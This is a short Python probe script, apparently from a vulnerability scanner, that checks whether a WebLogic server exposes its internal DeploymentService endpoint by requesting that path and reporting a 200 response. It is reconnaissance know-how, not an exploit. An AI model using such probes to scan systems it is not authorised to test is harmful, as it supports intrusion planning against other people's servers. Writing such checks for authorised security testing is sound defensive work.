#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: weblogic 接口泄露
referer: unknown
author: Lucifer
description: weblogic 接口泄露
'''
import sys
import requests

class weblogic_interface_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/bea_wls_deployment_internal/DeploymentService"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False, allow_redirects=False)

            if req.status_code == 200:
                return "[+]存在weblogic 接口泄露漏洞...(信息)\tpayload: "+vulnurl
            else:
                return "[-]no vuln"

        except:
            return "[-] ====>连接超时"

if __name__ == "__main__":
    testVuln = weblogic_interface_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()
